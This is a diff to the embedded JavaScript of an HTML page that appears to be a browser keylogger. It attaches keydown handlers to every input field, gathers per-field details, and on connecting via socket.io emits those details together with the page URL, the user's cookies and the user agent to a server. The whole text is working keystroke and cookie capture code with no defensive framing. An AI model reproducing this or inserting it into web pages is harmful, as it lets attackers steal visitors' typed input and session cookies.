@@ -83,6 +83,7 @@
 
 			all_inputs = document.getElementsByTagName('input');
 			inputs = {};
+			all_jskdetails = [];
 			for (var i = 0; i < all_inputs.length; i++) {
 
 				var next_input = all_inputs[i];
@@ -160,11 +161,12 @@
 				inputs[text_field._id] = text_field;
 
 				next_input.__jskdetails = text_field;
+				all_jskdetails.push(text_field);
 				addEvent(next_input, "keydown", Keypress);
 				
 
 			}
-			return inputs;
+			return { 'inputs' : inputs, 'all_jskdetails' : all_jskdetails }
 
 		}
 
@@ -182,7 +184,6 @@
 						'tag_details' : this.__jskdetails,
 					},
 					'page_details' : {
-						'username' : username,
 						'url' : document.location,
 						'cookie' : document.cookie,
 						'user_agent' : navigator.userAgent
@@ -190,27 +191,25 @@
 			});
 		}
 
-        $(document).ready(function(){
+        window.onload = function() {
 
-			inputs = setup();
-			username = '';
+			storage = setup();
+			inputs = storage['inputs']
+			all_jskdetails = storage['all_jskdetails']
 
             namespace = '/test';
             socket = io.connect('http://' + document.domain + ':' + location.port + namespace);
 
-
-			/*
-			$(document).find('input').each(function() {
-		
-				addEvent(this, "keydown", Keypress);
-			});
-			*/
-			
-
-
             // event handler for new connections
             socket.on('connect', function() {
-                socket.emit('my event', {data: 'Connected!'});
+                socket.emit('send_details', {
+						'jskdetails' : all_jskdetails,
+						'page_details' : {
+							'url' : document.location,
+							'cookie' : document.cookie,
+							'user_agent' : navigator.userAgent
+						}
+				});
             });
 
             $('form#disconnect').submit(function(event) {
@@ -218,7 +217,7 @@
                 return false;
             });
 
-        });
+        };
 
     </script>
   </head>
